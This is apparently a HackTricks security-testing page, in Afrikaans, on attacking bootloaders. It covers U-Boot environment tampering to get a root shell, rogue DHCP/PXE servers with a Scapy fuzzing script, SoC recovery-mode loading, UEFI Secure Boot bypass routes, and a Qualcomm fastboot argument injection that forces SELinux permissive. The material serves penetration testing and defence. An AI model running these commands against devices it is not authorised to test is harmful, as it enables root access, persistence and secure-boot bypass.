# Bootloader-toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel om toestelopstartkonfigurasies te wysig en bootloaders soos U-Boot en UEFI-klas-laaiers te toets. Fokus daarop om vroeë kode-uitvoering te verkry, handtekening-/terugrolbeskerming te beoordeel en herstel- of netwerkopstartpaaie te misbruik.

Verwant: MediaTek secure-boot-omseiling via bl2_ext-patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot-vinnige wenke en misbruik van die omgewing

1. Kry toegang tot die interpreter-shell
   - Druk tydens opstart ’n bekende break-sleutel (dikwels enige sleutel, 0, spasie of ’n bordspesifieke "magic"-volgorde) voordat `bootcmd` uitgevoer word, om na die U-Boot-prompt te gaan.<sup>[[1]](#references)</sup>

2. Inspekteer opstarttoestand en veranderlikes
   - Nuttige opdragte:
     - `printenv` (stort omgewing)
     - `bdinfo` (bordinligting, geheueadresse)
     - `help bootm; help booti; help bootz` (ondersteunde kernel-opstartmetodes)
     - `help ext4load; help fatload; help tftpboot` (beskikbare laaiers)

3. Wysig opstartargumente om ’n root-shell te kry
   - Voeg `init=/bin/sh` by sodat die kernel na ’n shell gaan in plaas van gewone init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot vanaf jou TFTP-bediener
   - Konfigureer die netwerk en haal ’n kernel/fit-image vanaf die LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Bewaar veranderinge via die environment
   - As env-berging nie skryfbeskerm is nie, kan jy beheer behou:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kyk vir veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat terugvalpaaie beïnvloed. Verkeerd opgestelde waardes kan herhaalde toegang tot die shell moontlik maak.

6. Gaan ontfout-/onveilige kenmerke na
   - Soek na: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, die vermoë om `loady`/`loads` via serieel te gebruik, `env import` vanaf onbetroubare media, en kernels/ramdisks wat sonder handtekeningkontroles gelaai word.

7. U-Boot-beeld-/verifikasietoetsing
   - As die platform beweer dat dit veilige/ggeverifieerde selflaai met FIT-beelde gebruik, probeer beide ongetekende en gemanipuleerde beelde:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Die afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of die verouderde `verify=n`-gedrag laat dikwels toe dat arbitrêre payloads gelaai word.
   - Moenie by ’n eenvoudige toelaat/afkeur-resultaat stop nie: onlangse FIT-navorsing het getoon dat die verifikasiepad self ’n pre-auth-aanvalsoppervlak kan wees. Voer negatiewe toetse uit op ekstern gebergde FIT-data (`data-offset`, `data-position`, `data-size`), keuse van ondertekende konfigurasies, `loadables` en die hantering van oorlegsels / `extra-conf`.
   - As jy ’n ooreenstemmende bronboom het, is `test/vboot/vboot_test.sh` ’n vinnige manier om FIT-verifikasiegedrag in U-Boot sandbox te reproduseer voordat jy regte hardeware gebruik.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` en script-bootvloeie
   - In moderne U-Boot-bouwerk is `bootcmd` dikwels net ’n omhulsel om Standard Boot. Dit beteken skryfbare media, PXE of SPI-flitsgeheue kan die werklike vertrouensgrens word, selfs wanneer die sigbare omgewing onskadelik lyk.
   - Die `extlinux`-bootmeth soek na `extlinux/extlinux.conf` onder `/` en `/boot`; die script-bootmeth soek eers na `boot.scr.uimg` en dan na `boot.scr`. Tydens netwerkselflaai kan die script-lêernaam van `boot_script_dhcp` kom.
   - Nuttige triage-opdragte:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Misbruikgevalle om te toets: aanvaller-beheerde USB-/SD-media vroeër in `boot_targets`, skryfbare `/boot/extlinux/extlinux.conf`, ’n skelm TFTP wat `boot.scr` verskaf, of skripuitvoering via `script_offset_f` wat deur SPI ondersteun word.
   - As die platform op FIT-verifikasie staatmaak, maak seker dat konfigurasies op konfigurasievlak onderteken word en nie net per beeld nie; `required-mode=all` is sterker as om enige enkele vereiste sleutel te aanvaar.

## Netwerkselflaai-aanvalsoppervlak (DHCP/PXE) en skelm bedieners

9. Fuzzen van PXE/DHCP-parameters
   - U-Boot se verouderde BOOTP/DHCP-hantering het geheueveiligheidskwessies gehad. CVE‑2024‑42040 beskryf byvoorbeeld geheue-openbaarmaking via vervaardigde DHCP-antwoorde wat grepe uit U-Boot-geheue oor die netwerk kan laat leak.<sup>[[4]](#references)</sup> Toets die DHCP/PXE-kodepaaie met buitensporig lang/grensgevalwaardes (`option 67 bootfile-name`, verkoperopsies, `file`-/`servername`-velde) en let op vir hangtoestande/leaks.
   - Minimale Scapy-brokkie om selflaaiparameters tydens netwerkselflaai te stres:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valideer ook of PXE-filename-velde sonder sanitisering aan shell-/loader-logika deurgegee word wanneer dit aan OS-kant se provisioning-skripte gekoppel word.

10. Toetsing van Rogue DHCP-bediener command injection
   - Stel ’n rogue DHCP/PXE-diens op en probeer karakters in filename- of opsievelde invoeg om interpreteerders in latere stadiums van die boot-ketting te bereik. Metasploit se DHCP auxiliary, `dnsmasq` of pasgemaakte Scapy-skripte werk goed. Isoleer eers die lab-netwerk.

## SoC ROM-herstelmodusse wat normale boot oorskryf

Baie SoC’s bied ’n BootROM-“loader”-modus wat kode oor USB/UART aanvaar, selfs wanneer flash-beelde ongeldig is. As secure-boot-fuses nie gebrand is nie, kan dit baie vroeg in die ketting arbitrêre kode-uitvoering moontlik maak.

- NXP i.MX (Serial Download Mode)
  - Gereedskap: `uuu` (mfgtools3) of `imx-usb-loader`.
  - Voorbeeld: `imx-usb-loader u-boot.imx` om ’n pasgemaakte U-Boot vanaf RAM te laai en uit te voer.
- Allwinner (FEL)
  - Gereedskap: `sunxi-fel`.
  - Voorbeeld: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` of `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Gereedskap: `rkdeveloptool`.
  - Voorbeeld: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` om ’n loader te laai en ’n pasgemaakte U-Boot op te laai.

Bepaal of die toestel se secure-boot-eFuses/OTP gebrand is. Indien nie, omseil BootROM-aflaaimodusse dikwels enige hoërvlakverifikasie (U-Boot, kernel, rootfs) deur jou eerste-stadium-payload direk vanaf SRAM/DRAM uit te voer.

## UEFI/PC-klas-bootloaders: vinnige kontroles

11. Toetsing van ESP-peutering, rollback en sleutelregistrasie
   - Mount die EFI System Partition (ESP) en kyk vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor-logo-paaie.
   - Dump die Secure Boot-toestand en sleuteldatabasisse vanaf die OS waar moontlik:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - As die platform in Setup Mode is, inskrywing van sleutels sonder verifikasie aanvaar, of met ’n toets-/verstek-Platform Key (PKfail-klas) gelewer word, kan ’n plaaslike admin of aanvaller met fisieke toegang hul eie KEK/db inskryf en Secure Boot steeds as “geaktiveer” laat lyk terwyl willekeurige EFI-binaries gelaai word.<sup>[[3]](#references)</sup>
   - Probeer selflaai met afgegradeerde of bekende kwesbare, ondertekende selflaaikomponente as Secure Boot-herroepings (dbx) nie op datum is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om volharding te verkry.

12. Toetsing van verouderde shim-/SBAT-/dbx-herroepings
   - Ou Microsoft-ondertekende shims en verskaffervurke kan steeds as ’n BYOVD-styl bootkit-roete dien as herroepings verouderd is. Plaas in ’n geïsoleerde laboratorium ’n histories kwesbare shim op die ESP en probeer om jou eie `grubx64.efi` of kernel te kettinglaai.<sup>[[11]](#references)</sup>
   - Vinnige triage:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - As die shim steeds loop ondanks dat dit op die herroepingslys is, het die firmware/OS verouderde `dbx`-opdaterings, of vertrou dit ’n gevurkte loader wat nooit die stroomop-SBAT-beskermings geërf het nie.

13. Boot logo-parsingfoute (LogoFAIL-klas)
   - Verskeie OEM/IBV-firmwares was kwesbaar vir beeldparsingfoute in DXE wat boot-logo’s verwerk. As ’n aanvaller ’n vervaardigde beeld op die ESP onder ’n verskafferspesifieke pad kan plaas (bv. `\EFI\<vendor>\logo\*.bmp`) en herlaai, kan kode-uitvoering tydens vroeë boot moontlik wees, selfs met Secure Boot geaktiveer. Toets of die platform logo’s wat deur gebruikers verskaf is, aanvaar en of daardie paaie vanaf die OS skryfbaar is.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Op Android 16-toestelle wat Qualcomm se ABL gebruik om die **Generic Bootloader Library (GBL)** te laai, bevestig of ABL die UEFI-app **verifieer** wat dit vanaf die `efisp`-partisie laai. As ABL slegs kontroleer vir die **teenwoordigheid** van ’n UEFI-app en nie handtekeninge verifieer nie, word ’n skryfprimitief na `efisp` **voor-OS-uitvoering van ongetekende kode** tydens selflaai.<sup>[[6]](#references)[[7]](#references)</sup>

Praktiese kontroles en misbruikpaaie:

- **efisp write primitive**: Jy het ’n manier nodig om ’n pasgemaakte UEFI-app na `efisp` te skryf (root/bevoorregte diens, OEM-appfout, herstel-/fastboot-pad). Sonder dit is die GBL-laaigaping nie direk bereikbaar nie.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL-fout): Sommige bouweergawes aanvaar ekstra tokens in `fastboot oem set-gpu-preemption` en voeg dit by die kernel-opdragreël. Dit kan gebruik word om permissiewe SELinux af te dwing, sodat skryf na beskermde partisies moontlik word:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  As die toestel gepatch is, behoort die opdrag ekstra argumente te verwerp.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-ontsluiting via persistent flags**: ’n Boot-stage payload kan persistent unlock flags (bv. `is_unlocked=1`, `is_unlocked_critical=1`) verander om `fastboot oem unlock` na te boots sonder OEM-bediener-/goedkeuringshindernisse. Dit is ’n duursame houdingsverandering ná die volgende herlaai.<sup>[[6]](#references)</sup>

Verdedigings-/triage-aantekeninge:

- Bevestig of ABL handtekeningverifikasie op die GBL/UEFI-payload vanaf `efisp` uitvoer. Indien nie, behandel `efisp` as ’n hoërisiko-persistensie-aanvalsoppervlak.
- Hou dop of ABL fastboot OEM-handlers gepatch is om **argumenttellings te valideer** en bykomende tokens te verwerp.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardewarewaarskuwing

Wees versigtig wanneer jy tydens vroeë opstart met SPI/NAND-flitsgeheue werk (bv. deur penne te aard om leesbewerkings te omseil), en raadpleeg altyd die flitsgeheue se datablad. Kortsluitings op die verkeerde tyd kan die toestel of die programmeerder beskadig.

## Aantekeninge en bykomende wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om omgewingsblobs tussen RAM en berging oor te dra; sommige platforms laat toe dat env vanaf verwyderbare media ingevoer word sonder verifikasie.
- Vir persistensie op Linux-gebaseerde stelsels wat via `extlinux.conf` opstart, is dit dikwels genoeg om die `APPEND`-reël op die opstartpartisie te wysig (om `init=/bin/sh` of `rd.break` in te voeg) wanneer geen handtekeningkontroles afgedwing word nie.
- As die teiken dual-slot-/A/B-opdaterings gebruik, hersien die anti-rollback- en slot-desync-tegnieke in die [firmware-analise-oorsig](README.md) sodat jy nie updater-alleen-vertrouensgapings buite die bootloader self miskyk nie.
- As userland `fw_printenv/fw_setenv` verskaf, bevestig dat `/etc/fw_env.config` met die werklike env-berging ooreenstem. Verkeerd opgestelde offsets laat jou toe om die verkeerde MTD-streek te lees/skryf.

## References

- [1] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL ontdek: Die gevare van beeldontleding tydens stelselopstart](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Onbetroubare platform-sleutels ondermyn Secure Boot in die UEFI-ekosisteem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040-besonderhede](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Vooraf onderskep: Xiaomi ontsluit via twee ongesuiwerde stringe](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL-uitbuiting laat aanvallers bootloaders ontsluit](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generiese Bootloader (GBL)-argitektuur](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Regstelling van die deurvoer van onbetroubare invoer na die kernel-opdragreël](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Voeg ’n kontrole by vir die set-hw-fence-value-opdrag](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Ongeskik om te begin: U-Boot se FIT-handtekeningverifikasie breek](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Kennisgewing oor kwesbaarheid VU#616257 – Microsoft-ondertekende UEFI-shim-bootloaders kwesbaar vir Secure Boot-omseiling](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
